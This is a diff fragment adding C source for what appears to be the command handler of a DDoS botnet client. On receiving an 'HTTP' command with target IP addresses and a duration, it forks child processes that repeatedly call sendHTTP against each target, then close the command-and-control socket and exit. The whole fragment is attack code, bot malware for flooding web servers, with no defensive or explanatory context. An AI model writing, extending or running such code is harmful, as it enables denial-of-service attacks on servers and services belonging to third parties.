@@ -1,0 +1,39 @@
+       if(!strcmp(argv[0], "HTTP"))
+    {
+        if(argc < 3 || atoi(argv[2]) < 1)
+        {
+            return;
+        }
+ 
+        unsigned char *ip = argv[1];
+        int time = atoi(argv[2]);
+ 
+        if(strstr(ip, ",") != NULL)
+        {
+            unsigned char *hi = strtok(ip, ",");
+            while(hi != NULL)
+            {
+                if(!listFork())
+                {
+                    int i = 0;
+                    while(i < 10){
+                        sendHTTP(ip, time);
+                        i++;
+                    }
+                    close(mainCommSock);
+                    _exit(0);
+                }
+                hi = strtok(NULL, ",");
+            }
+        } else {
+            if (listFork()) { return; }
+            int i = 0;
+            while(i < 10){
+                sendHTTP(ip, time);
+                i++;
+            }
+            close(mainCommSock);
+ 
+            _exit(0);
+        }
+    }
